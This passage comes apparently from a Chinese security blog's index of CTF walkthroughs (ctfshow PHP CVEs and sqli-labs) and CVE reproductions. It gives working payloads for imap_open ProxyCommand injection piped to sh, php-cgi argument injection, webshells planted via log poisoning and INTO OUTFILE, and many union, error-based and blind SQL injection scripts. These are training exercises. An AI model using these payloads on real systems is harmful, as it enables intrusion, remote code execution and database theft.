$options = []\n): IMAP\\Connection|false\n```\n\n介绍一下参数mailbox\n\n![在这里插入图片描述](../image/achieve/202411/CVE复现/ff04ed1a81ceb3a99311137ef7f85490.png)\n\n### 0x02漏洞成因\n\n其`imap_open`函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。因为ssh命令中可以通过设置`-oProxyCommand=`来调用第三方命令，通过注入这个参数，最终将导致命令执行漏洞。\n\n## 环境搭建\n\nvulhub靶场有这个CVE的docker环境，直接启动容器就行了\n\n```\n/opt/vulhub/php/CVE-2018-19518# docker-compose up -d\n```\n\n## 漏洞复现\n\n访问8080端口可以看到\n\n![image-20250606170846456](../image/achieve/202411/CVE复现/image-20250606170846456.png)\n\n有传入服务器地址的表单，既然是命令执行漏洞并且知道注入点在哪，我们先看源码index.php\n\n```php\n<?php\nif(!empty($_POST)) {\n    $imap = @imap_open('{'.$_POST['hostname'].':993/imap/ssl}INBOX', $_POST['username'], $_POST['password']);\n}\n?>\n```\n\n可以看到这里会直接拼接我们传入的字符串，之前就了解了这个漏洞点在imap_open函数的mailbox参数，那我们构造恶意代码，先抓包处理\n\n因为这里前面有花括号，所以我们只需要传入后花括号去闭合就行了，我们构造命令\n\n```php\nBASE64 编码 + URL编码 echo '1234567890'>/tmp/test0001得到 \nZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d\n\n传参hostname = x+-oProxyCommand%3decho%09 + 编码后的命令 + |base64%09-d|sh}\n```\n\n最后的请求包\n\n```\nPOST / HTTP/1.1\nHost: 38.55.99.239:8080\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://38.55.99.239:8080/\nCache-Control: max-age=0\nOrigin: http://38.55.99.239:8080\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\nUpgrade-Insecure-Requests: 1\nAccept-Language: zh-CN,zh;q=0.9\nContent-Length: 32\n\nhostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222\n```\n\n然后我们进入容器\n\n```\ndocker-compose exec web bash\n```\n\n然后在tmp目录下找到刚刚的文件\n\n![image-20250606172441420](../image/achieve/202411/CVE复现/image-20250606172441420.png)\n\n可以看到成功写入了，那就没毛病，复现完成，退出docker环境\n\n## 漏洞修复\n\n- 第一个肯定就是检查用户传入的参数的值了\n- 在 mailbox 参数中使用某些标志，其中 /norsh 标志可以用来禁用IMAP预身份认证模式。\n","tags":["漏洞复现"],"categories":["CVE"]},{"title":"ctfshow入门phpCVE","url":"/2025/06/06/ctfshow入门phpCVE/","content":"\n## web311\n\n### #CVE-2019-11043\n\n看一下PHP的版本是php7.1.33，搜出来是CVE-2019-11043，这个之前复现过，直接用工具打就行了\n\n```\ngit clone https://github.com/neex/phuip-fpizdam.git\ncd phuip-fpizdam\ngo get -v && go build\n```\n\n安装好后运行试一下\n\n```\n./phuip-fpizdam\n```\n\n![image-20250606132608084](../image/achieve/202411/phpCVE/image-20250606132608084.png)\n\n然后直接污染进程就行\n\n```\nroot@VM-16-12-ubuntu:/opt/phuip-fpizdam# go run . http://474ac806-1e82-4f81-ac06-0c265513d0d7.challenge.ctf.show/\n2025/06/06 13:24:10 Failed to create requester: well I believe the url must end with \".php\". Maybe I'm wrong, delete this check if you feel like it\nexit status 1\nroot@VM-16-12-ubuntu:/opt/phuip-fpizdam# go run . http://474ac806-1e82-4f81-ac06-0c265513d0d7.challenge.ctf.show/index.php\n```\n\n![image-20250606132700405](../image/achieve/202411/phpCVE/image-20250606132700405.png)\n\n成功了，然后我们传入\n\n```\n?a=id\n```\n\n注意，因为php-fpm会启动多个子进程，在访问/index.php?a=id时需要多访问几次，以访问到被污染的进程。\n\n![image-20250606132955015](../image/achieve/202411/phpCVE/image-20250606132955015.png)\n\n出来了，能RCE，那就直接读flag吧\n\n```\n/index.php?a=cat fl0gHe1e.txt\n```\n\n## web312\n\n### #CVE-2018-19158\n\n看到这个带邮箱以及用户名密码的界面一眼就知道是CVE-2018-19158了，关于php的imap扩展的一个命令执行漏洞，直接打就行\n\n先抓包构造请求\n\n![image-20250606135312651](../image/achieve/202411/phpCVE/image-20250606135312651.png)\n\n因为是通过ssh中一个参数-oProxyCommand执行命令的，那我们在第一个参数中传入该参数，也就是在hostname中传入\n\n```\nBASE64 编码 <?=phpinfo()?>得到PD9waHAgcGhwaW5mbygpOz8+\n\n然后BASE64 编码 + URL编码 echo \"PD89cGhwaW5mbygpPz4=\" | base64 -d > /var/www/html/test.php得到 ZWNobyAiUEQ4OWNHaHdhVzVtYnlncFB6ND0iIHwgYmFzZTY0IC1kID4gL3Zhci93d3cvaHRtbC90ZXN0LnBocA%3d%3d\n\n传参hostname = x+-oProxyCommand%3decho%09 + 编码后的命令 + |base64%09-d|sh}\n```\n\n然后访问test.php\n\n![image-20250606140926871](../image/achieve/202411/phpCVE/image-20250606140926871.png)\n\n可以看到成功写入文件并解析php代码\n\n后面的话换一下代码写进去然后RCE就行了\n\n## web313\n\n### #CVE-2012-1823\n\n一个参数处理产生的问题导致可以利用cgi参数进行命令执行，我们先用-s参数看一下源码\n\n```\n/?-s\n```\n\n![image-20250606190318200](../image/achieve/202411/phpCVE/image-20250606190318200.png)\n\n好吧啥都没有，flag in my disk somewhere源码提示在somewhere中\n\n那就用-d去打文件包含吧\n\n```\n?-d+allow_url_include%3Don+-d+auto_prepend_file%3Dphp://input\n```\n\n然后post传入php代码\n\n![image-20250606190555554](../image/achieve/202411/phpCVE/image-20250606190555554.png)\n\n成功执行，那我们直接打\n\n## web314\n\n```php\n<?php\n\nerror_reporting(0);\n\nhighlight_file(__FILE__);\n\n//phpinfo\n$file = $_GET['f'];\n\nif(!preg_match('/\\:/',$file)){\n    include($file);\n}\n```\n\n这个其实不看cve也能打，用日志文件包含就行了，UA头写马\n\n```\n<?=`$_GET[1]`?>\n```\n\n然后传参\n\n```\n?f=/var/log/nginx/access.log&1=whoami\n```\n\n![image-20250606191643980](../image/achieve/202411/phpCVE/image-20250606191643980.png)\n\n成功执行\n\n## web315\n\n### #Xdebug-RCE\n\n这是php的XDebug远程调试导致代码执行漏洞https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/README.zh-cn.md\n\n![image-20250607131941635](../image/achieve/202411/phpCVE/image-20250607131941635.png)\n\n这道题有exp，直接用\n\n![image-20250607132530159](../image/achieve/202411/phpCVE/image-20250607132530159.png)\n","tags":["phpCVE"],"categories":["ctfshow"]},{"title":"ctfshow入门sqli-labs","url":"/2025/06/04/ctfshow入门sqli-labs/","content":"\n面试的时候碰上宽字节注入的问题了，一直没怎么好好看过，说明自己sql的篇章学的还不够\n\n## web517\n\n### #GET字符型union\n\n```\nPlease input the ID as parameter with numeric value\n```\n\nGET传一个ID，一开始以为是大写后面发现是小写\n\n```\n?id=-1' union select 1,2,3--+ 有回显2和3\n\n?id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+ 数据库为ctfshow,ctftraining,information_schema,mysql,performance_schema,security,test\n\n?id=-1' union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema='ctfshow')--+ 有一个flag表\n\n?id=-1' union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name='flag')--+ flag字段\n\n?id=-1' union select 1,2,(select flag from ctfshow.flag)--+\n```\n\n## web518\n\n### #GET数字型union\n\n```\n?id=-1 union select 1,2,3 有回显2和3\n\n?id=-1 union select 1,(select group_concat(schema_name)from information_schema.schemata),(select group_concat(table_name)from information_schema.tables where table_schema='ctfshow') 找到flagaa\n\n?id=-1 union select 1,(select group_concat(column_name)from information_schema.columns where table_name='flagaa'),(select group_concat(table_name)from information_schema.tables where table_schema='ctfshow') flagac字段\n\n?id=-1 union select 1,(select flagac from ctfshow.flagaa),3\n```\n\n## web519\n\n### #GET单引号括号union\n\n传入引号发现是单引号和括号闭合的\n\n```\n?id=-1')--+\n```\n\n无过滤，正常打就行了\n\n## web520\n\n### #GET双引号括号union\n\n传入单引号没反应，估计是过滤单引号了\n\n传入一个反斜杠转义一下看看报错\n\n![image-20250604100020624](../image/achieve/202411/sqli-labs/image-20250604100020624.png)\n\n双引号括号闭合\n\n```\n?id=1\")--+\n```\n\n也是没过滤的，正常打就行\n\n## web521\n\n### #GET单引号布尔\n\n单引号闭合，但是没回显执行结果，测一下盲注\n\n```\n?id=1' and 0--+ 无回显\n?id=1' and 1--+ 回显You are in...........\n```\n\n布尔盲注，写脚本直接打吧\n\n```python\nimport requests\n\nurl = \"http://f8b07768-2709-42d1-854d-e9285a4e3f31.challenge.ctf.show/\"\ni = 0\ntarget = \"\"\n\nwhile True:\n    i += 1\n    head = 32\n    tail = 127\n    while head < tail:\n        mid = (head + tail) // 2\n        #payload =f\"?id=1' and if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),{i},1))>{mid},1,0)%23\"\n        #payload = f\"?id=1' and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),{i},1))>{mid},1,0)--+\"\n        #payload = f\"?id=1' and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flagpuck'),{i},1))>{mid},1,0)--+\"\n        payload = f\"?id=1' and if(ascii(substr((select flag33 from ctfshow.flagpuck),{i},1))>{mid},1,0)--+\"\n\n        r = requests.get(url=url+payload)\n        if \"You are in...........\" in r.text:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        target += chr(head)\n        print(target)\n    else :\n        break\nprint(target)\n```\n\n## web522\n\n### #GET双引号布尔\n\n这次是双引号闭合的布尔盲注，也是直接打就行，无过滤\n\n```python\nimport requests\n\nurl = \"http://0f955bc4-8f20-4bf7-8a70-f26b9ffda870.challenge.ctf.show/\"\ni = 0\ntarget = \"\"\n\nwhile True:\n    i += 1\n    head = 32\n    tail = 127\n    while head < tail:\n        mid = (head + tail) // 2\n        #payload =f\"?id=1\\\" and if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),{i},1))>{mid},1,0)%23\"\n        #payload = f\"?id=1\\\" and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),{i},1))>{mid},1,0)--+\"\n        #payload = f\"?id=1\\\" and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flagpa'),{i},1))>{mid},1,0)--+\"\n        payload = f\"?id=1\\\" and if(ascii(substr((select flag3a3 from ctfshow.flagpa),{i},1))>{mid},1,0)--+\"\n\n        r = requests.get(url=url+payload)\n        if \"You are in...........\" in r.text:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        target += chr(head)\n        print(target)\n    else :\n        break\nprint(target)\n```\n\n## web523\n\n### #GET单引号双括号文件注入\n\n传入一个1显示\n\n![image-20250604102846076](../image/achieve/202411/sqli-labs/image-20250604102846076.png)\n\n意思是让我们写入文件吧，把输出结果传入文件中然后访问文件查看输出\n\n但是需要先判断闭合方式\n\n不过测了一会之后发现只会返回报错而不会返回报错信息，最后\n\n```\n?id=1'))--+\n```\n\n猜到是单引号双括号闭合，报错只有一种，但还是可以判断字段数的，字段数是3，那我们尝试把输出写入文件中\n\n```\n?id=1')) union select 1,user(),version() into outfile '/var/www/html/3.txt'--+\n```\n\n![image-20250604103543081](../image/achieve/202411/sqli-labs/image-20250604103543081.png)\n\n成功传入输出\n\n看到语言版本是php5.6的，看看能不能写php文件\n\n```\n?id=1')) union select 1,2,'<?php phpinfo();?>' into outfile '/var/www/html/shell.php'--+\n```\n\n![image-20250604103742163](../image/achieve/202411/sqli-labs/image-20250604103742163.png)\n\n看来是可以写的，那我们直接写个马子\n\n```\n?id=1')) union select 1,2,'<?php system($_GET[1]);?>' into outfile '/var/www/html/shell1.php'--+\n```\n\n但是好像flag不在文件中还是在数据库中，大意了。。。\n\n那就正常查询然后输出到文件吧\n\n```\n?id=1')) union select -1,(select group_concat(schema_name)from information_schema.schemata),(select group_concat(table_name)from information_schema.tables where table_schema='ctfshow') into outfile '/var/www/html/1.txt'--+\n\n?id=-1')) union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name='flagdk') into outfile '/var/www/html/2.txt'--+\n\n?id=-1')) union select 1,2,(select flag43 from ctfshow.flagdk) into outfile '/var/www/html/4.txt'--+\n```\n\n## web524\n\n### #GET单引号布尔\n\n测出来是单引号闭合，不过也是没过滤的\n\n```python\nimport requests\n\nurl = \"http://d0872a9a-8aae-42f8-8ba0-a04604efe962.challenge.ctf.show/\"\ni = 0\ntarget = \"\"\n\nwhile True:\n    i += 1\n    head = 32\n    tail = 127\n    while head < tail:\n        mid = (head + tail) // 2\n        #payload =f\"?id=-1' or if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),{i},1))>{mid},1,0)%23\"\n        #payload = f\"?id=-1' or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),{i},1))>{mid},1,0)--+\"\n        #payload = f\"?id=-1' or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flagjugg'),{i},1))>{mid},1,0)--+\"\n        payload = f\"?id=-1' or if(ascii(substr((select flag423 from ctfshow.flagjugg),{i},1))>{mid},1,0)--+\"\n\n        r = requests.get(url=url+payload)\n        if \"You are in...........\" in r.text:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        target += chr(head)\n        print(target)\n    else :\n        break\nprint(target)\n```\n\n## web525\n\n### #GET单引号时间\n\n```\n?id=1' and sleep(2)--+\n```\n\n测出来有延迟，那就打时间盲注\n\n```python\nimport requests\nimport time\n\nurl = \"http://cec0fddc-870f-47da-bc4e-cbf1e9707bfe.challenge.ctf.show/\"\ni = 0\ntarget = \"\"\n\nwhile True:\n    i += 1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) // 2\n        #payload = f\"?id=1' and if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),{i},1))>{mid},sleep(2),0)--+\"\n        #payload = f\"?id=1' and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),{i},1))>{mid},sleep(2),0)--+\"\n        #payload = f\"?id=1' and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flagug'),{i},1))>{mid},sleep(2),0)--+\"\n        payload = f\"?id=1' and if(ascii(substr((select flag4a23 from ctfshow.flagug),{i},1))>{mid},sleep(2),0)--+\"\n\n        start = time.time()\n        r = requests.get(url + payload)\n        end = time.time() - start\n\n        if end > 1.5 :\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32 :\n        target += chr(head)\n        print(target)\n    else :\n        break\nprint(target)\n```\n\n## web526\n\n### #GET双引号时间\n\n```\n?id=1' and sleep(2)--+\n```\n\n换成双引号就行\n\n```python\nimport requests\nimport time\n\nurl = \"http://febcd613-15f2-442e-b978-a02b307d2f73.challenge.ctf.show/\"\ni = 0\ntarget = \"\"\n\nwhile True:\n    i += 1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) // 2\n        #payload = f\"?id=1\\\" and if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),{i},1))>{mid},sleep(2),0)--+\"\n        #payload = f\"?id=1\\\" and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),{i},1))>{mid},sleep(2),0)--+\"\n        #payload = f\"?id=1\\\" and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flagugs'),{i},1))>{mid},sleep(2),0)--+\"\n        payload = f\"?id=1\\\" and if(ascii(substr((select flag43s from ctfshow.flagugs),{i},1))>{mid},sleep(2),0)--+\"\n\n        start = time.time()\n        r = requests.get(url + payload)\n        end = time.time() - start\n\n        if end > 1.5 :\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32 :\n        target += chr(head)\n        print(target)\n    else :\n        break\nprint(target)\n```\n\n## web527\n\n###  #POST字符型union\n\n这次的话是post传参，先测一下注入点，发现两个都可以注入\n\n```\npasswd=1'or '1'='1'--+&submit=Submit&uname=1\n```\n\n然后正常联合注入就行了\n\n```\npasswd=1&submit=Submit&uname=1' union select 1,(select group_concat(schema_name)from information_schema.schemata)--+\n\npasswd=1&submit=Submit&uname=1' union select 1,(select group_concat(table_name)from information_schema.tables where table_schema='ctfshow')--+\n\npasswd=1&submit=Submit&uname=1' union select 1,(select group_concat(column_name)from information_schema.columns where table_name='flagugsd')--+\n\npasswd=1&submit=Submit&uname=1' union select 1,(select flag43s from ctfshow.flagugsd)--+\n```\n\n## web528\n\n### #POST双引号括号union\n\n这次是双引号括号闭合的，也是一样直接打就行\n\n## web529\n\n### #POST单引号括号盲注\n\n测出来是单引号括号，但是没回显执行结果\n\n```\npasswd=1&submit=Submit&uname=1') or '1'='1'--+\n```\n\n![image-20250604130047877](../image/achieve/202411/sqli-labs/image-20250604130047877.png)\n\n我发现这题可以打盲注也可以打报错注入，貌似前面的题也是可以打报错注入的\n\n报错注入\n\n```\npasswd=1&submit=Submit&uname=1') or (select updatexml(1,concat(0x7e,(database()),0x7e),1))--+\n```\n\n回显\n\n```\nXPATH syntax error: '~security~'\n```\n\n打盲注吧\n\n```\npasswd=1&submit=Submit&uname=1') or if(1<2,1,0)--+\n```\n\n我发现有一个问题\n\n### #关于解码问题\n\n如果我们在web页面采用表单提交的话\n\n```\nuname=1') or if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),1,1))>1,1,0)--+\n```\n\n抓包可以看到\n\n![image-20250604142949157](../image/achieve/202411/sqli-labs/image-20250604142949157.png)\n\n此时空格会被编码为`+`号，而我们末尾的注释符中的`+`号不会被编码，然后由于在服务器接收数据后**解析application/x-www-form-urlencoded协议**，会先将+替换成空格，然后才会进行url解码操作，此时到达sql服务器的语句就是\n\n```\nuname=1') or if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),1,1))>1,1,0)--(空格)\n```\n\n然而在requests发送请求的时候，requests库会对特殊字符全部都进行URl编码\n\n```\n# 输入的\npayload = \"1') or 1=1 --+\"\n\n# Requests实际发送\nuname=1%27%29%20or%201%3D1%20--%2B\n```\n\n到达服务器的时候服务器解析协议就不会将%2b替换成空格而是作为正常的编码字符并在后面解码为`+`所以我们如果在POST传参的时候如果期望request库进行编码的话那就传入data参数，如果需要传入原始字符那就使用json参数\n\n然后就会有个新的问题出现\n\n- 为什么之前GET请求的时候用--+就可以呢？\n\n第一个就是URL参数和表单数据的解析规则不同\n\nURL参数的解析是先解码再替换，而表单数据的解析是先替换再解码\n\n然后回顾之前我们的request发送请求\n\n```\nrequests.get(url, params=params) 与 requests.get(url + params)\n```\n\n一个是传参一个是直接拼接，前者会进行url编码后者不会，这也导致了我们利用拼接的时候可以顺利的将+处理为空格\n\n假如我们用编码的方式，那么就不能用+号了\n\n![image-20250604142053653](../image/achieve/202411/sqli-labs/image-20250604142053653.png)\n\n此时无法被作为注释符号，所以我们可以换成--空格的形式\n\n![image-20250604142022998](../image/achieve/202411/sqli-labs/image-20250604142022998.png)\n\n可以看到此时空格被替换成了+号，那就进入服务器的时候+号就会被解码成空格，从而被作为注释符号\n\n结论：\n\n当我们需要用到request库的自动编码功能的时候，我们可以将+号替换成我们的空格\n\n当我们直接对参数进行拼接的时候（或传入原始字符串），我们可以直接使用+号，此时+号不会进行编码\n\n所以我们写脚本\n\n```python\nimport requests\n\nurl = 'http://4fea7074-c4fa-414e-8d0e-d9f475c1379b.challenge.ctf.show/'\ntarget = \"\"\ni = 0\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #payload = f\"1') or if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),{i},1))>{mid},1,0)-- \"\n        #payload = f\"1') or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),{i},1))>{mid},1,0)-- \"\n        #payload = f\"1') or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flag'),{i},1))>{mid},1,0)-- \"\n        payload = f\"1') or if(ascii(substr((select flag4 from ctfshow.flag),{i},1))>{mid},1,0)-- \"\n\n        data = {\n            'uname': payload,\n            'passwd': '1'\n        }\n\n        r = requests.post(url=url, data=data)\n        if 'flag.jpg' in r.text:\n            head = mid + 1\n        else:\n            tail = mid\n\n    if head != 32:\n        target += chr(head)\n        print(target)\n    else:\n        break\nprint(target)\n\n```\n\n## web530\n\n### #POST双引号盲注\n\n```\npasswd=1&submit=Submit&uname=1\" or \"1\"=\"2\"--+ 登录失败\npasswd=1&submit=Submit&uname=1\" or \"1\"=\"1\"--+ 登录成功\n```\n\n双引号闭合的布尔盲注\n\n提一嘴：未知用户名的情况下最好还是用and，因为这里用户名为1是没有的所以sql语句前面为False，所以只需要关注我们传入的注入语句返回的1或者0就行了\n\n```python\nimport requests\nfrom tensorflow.tools.docs.doc_controls import header\n\nurl = 'http://992e90cf-af1b-44c7-9737-caab7309a448.challenge.ctf.show/'\ntarget = \"\"\ni = 0\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #payload = f\"1\\\" or if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),{i},1))>{mid},1,0)-- \"\n        #payload = f\"1\\\" or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),{i},1))>{mid},1,0)-- \"\n        #payload = f\"1\\\" or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flagb'),{i},1))>{mid},1,0)-- \"\n        payload = f\"1\\\" or if(ascii(substr((select flag4s from ctfshow.flagb),{i},1))>{mid},1,0)-- \"\n\n        data = {\n            \"uname\": payload,\n            \"passwd\": \"1\"\n        }\n        r = requests.post(url=url, data=data)\n        if 'flag.jpg' in r.text:\n            head = mid + 1\n        else:\n            tail = mid\n\n    if head != 32:\n        target += chr(head)\n        print(target)\n    else:\n        break\nprint(target)\n```\n\n## web531\n\n### #POST单引号盲注\n\n```python\nimport requests\n\nurl = 'http://ff847980-6013-41f5-a198-1dbf37103816.challenge.ctf.show/'\ntarget = \"\"\ni = 0\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #payload = f\"1\\\" or if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),{i},1))>{mid},1,0)-- \"\n        #payload = f\"1' or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),{i},1))>{mid},1,0)-- \"\n        #payload = f\"1' or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flagba'),{i},1))>{mid},1,0)-- \"\n        payload = f\"1' or if(ascii(substr((select flag4sa from ctfshow.flagba),{i},1))>{mid},1,0)-- \"\n\n        data = {\n            \"uname\": payload,\n            \"passwd\": \"1\"\n        }\n        r = requests.post(url=url, data=data)\n        if 'flag.jpg' in r.text:\n            head = mid + 1\n        else:\n            tail = mid\n\n    if head != 32:\n        target += chr(head)\n        print(target)\n    else:\n        break\nprint(target)\n\n```\n\n## web532\n\n### #POST双引号括号盲注\n\n```\npasswd=1&submit=Submit&uname=1\") or if(1<2,1,0)--+ 登录成功\npasswd=1&submit=Submit&uname=1\") or if(1>2,1,0)--+ 登录失败\n```\n\n找到闭合方式了那就写脚本吧\n\n其实一般布尔盲注都是支持时间盲注的，不过能用布尔的话还是用布尔，毕竟布尔还是快一点\n\n脚本\n\n```python\nimport requests\n\nurl = 'http://cbe4fbaf-ccab-42f8-96ec-32870da3c6c6.challenge.ctf.show/'\ntarget = \"\"\ni = 0\n\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #payload = f\"1\\\") or if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),{i},1))>{mid},1,0)-- \"\n        #payload = f\"1\\\") or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),{i},1))>{mid},1,0)-- \"\n        #payload = f\"1\\\") or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flagbab'),{i},1))>{mid},1,0)-- \"\n        payload = f\"1\\\") or if(ascii(substr((select flag4sa from ctfshow.flagbab),{i},1))>{mid},1,0)-- \"\n\n        data = {\n            \"uname\": payload,\n            \"passwd\": \"1\"\n        }\n\n        r = requests.post(url=url, data=data)\n\n        if 'flag.jpg' in r.text:\n            head = mid + 1\n        else:\n            tail = mid\n\n    if head != 32:\n        target += chr(head)\n        print(target)\n    else:\n        break\nprint(target)\n\n```\n\n## web533\n\n### #报错注入\n\n一个重置密码的页面，但是必须传入一个存在的用户名才有回显好像\n\n![image-20250604150659330](../image/achieve/202411/sqli-labs/image-20250604150659330.png)\n\n\n\n注入点在passwd，单引号闭合，但是后面没啥回显，看看能不能打报错注入\n\n```\npasswd=1'and (select updatexml(1,concat(0x7e,(database()),0x7e),1))--+&submit=Submit&uname=admin\n```\n\n有回显，那就打吧\n\n需要用切片函数截取一下\n\n```\npasswd=1'and (select updatexml(1,concat(0x7e,left((select flag4 from ctfshow.flag),30),0x7e),1))--+&submit=Submit&uname=admin\n\npasswd=1'and (select updatexml(1,concat(0x7e,right((select flag4 from ctfshow.flag),30),0x7e),1))--+&submit=Submit&uname=admin\n```\n\n## web534\n\n### #UA头单引号报错注入\n\n```\nYour IP ADDRESS is: 172.12.23.142\n```\n\n看到一个ip地址的回显，猜测是请求头的注入\n\n一开始以为是在XFF上的注入，后面弱口令登入后返回了一个UA头信息，才知道是在UA头注入\n\n![image-20250604152356237](../image/achieve/202411/sqli-labs/image-20250604152356237.png)\n\nUA头注入普遍来说就是登录成功后服务器会记录当前UA头的情况，所以可以看成是一个insert插入或update更新，那我们可以打报错注入\n\n推测后台插入语句\n\n```\n$insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\";\n```\n\n所以插入语句\n\n```\nUser-Agent: ' and updatexml(1,concat(0x7e,(version()),0x7e),1) and '\n```\n\n![image-20250604153215767](../image/achieve/202411/sqli-labs/image-20250604153215767.png)\n\n成功注入并产生报错\n\n那我们继续打就行\n\n```\n' and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),0x7e),1) and '\n\n' and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='flag'),0x7e),1) and '\n\n' and updatexml(1,concat(0x7e,left((select flag4 from ctfshow.flag),30),0x7e),1) and '\n' and updatexml(1,concat(0x7e,right((select flag4 from ctfshow.flag),30),0x7e),1) and '\n```\n\n至于这里前面的单引号，去掉传进去看到语法错误就知道为什么了\n\n```\nYou have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '', '172.12.23.142')' at line 1\n```\n\n其实也就是根据语句中UA头用单引号包裹做的一个闭合操作，后面的话也可以直接用#注释掉\n\n## web535\n\n### #Rerferer头单引号报错注入\n\n传入弱口令登录后返回Rerferer头信息，尝试打报错注入\n\n```\n' and updatexml(1,concat(0x7e,(select version()),0x7e),1) and '\n```\n\n那就直接打\n\n```\n' and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),0x7e),1) and '\n\n' and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='flag'),0x7e),1) and '\n\n' and updatexml(1,concat(0x7e,left((select flag4 from ctfshow.flag),30),0x7e),1) and '\n' and updatexml(1,concat(0x7e,right((select flag4 from ctfshow.flag),30),0x7e),1) and '\n```\n\n## web536\n\n### #Cookie头单引号报错注入\n\n传入admin/admin弱口令后返回cookie信息\n\n![image-20250604154453790](../image/achieve/202411/sqli-labs/image-20250604154453790.png)\n\n那我们对当前Cookie的uname进行注入\n\n```\nuname=admin' and updatexml(1,concat(0x7e,(select version()),0x7e),1)#\n```\n\n![image-20250604155223814](../image/achieve/202411/sqli-labs/image-20250604155223814.png)\n\n然后注入就行了\n\n```\nuname=admin' and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),0x7e),1)#\n\nuname=admin' and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='flag'),0x7e),1)#\n\nuname=admin' and updatexml(1,concat(0x7e,left((select flag4 from ctfshow.flag),30),0x7e),1)#\nuname=admin' and updatexml(1,concat(0x7e,right((select flag4 from ctfshow.flag),30),0x7e),1)#\n```\n\n## web537\n\n### #Cookie头单引号+编码报错注入\n\n这次Cookie头做了一个base64编码处理\n\n![image-20250604160309527](../image/achieve/202411/sqli-labs/image-20250604160309527.png)\n\n我们也正常传入编码字符串\n\n```\nuname=YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IHZlcnNpb24oKSksMHg3ZSksMSkj\n```\n\n但是好像#号的注释作用没了\n\n![image-20250604160613676](../image/achieve/202411/sqli-labs/image-20250604160613676.png)\n\n我们用闭合吧\n\n例如查询版本\n\n```\nadmin' and updatexml(1,concat(0x7e,(select version()),0x7e),1) and '\n```\n\nbase64编码后传入就行\n\n## web538\n\n### #Cookie双引号+编码报错注入\n\n传入双引号后产生报错\n\n```\nuname=Ig==\n```\n\n![image-20250604161505213](../image/achieve/202411/sqli-labs/image-20250604161505213.png)\n\n说明是双引号闭合\n\n也是直接打就行\n\n## web539\n\n### #单引号前后闭合union\n\n测了一下是单引号闭合但是注释符号被过滤了，只能试着去闭合了\n\n```\n?id=1' or '1'='1 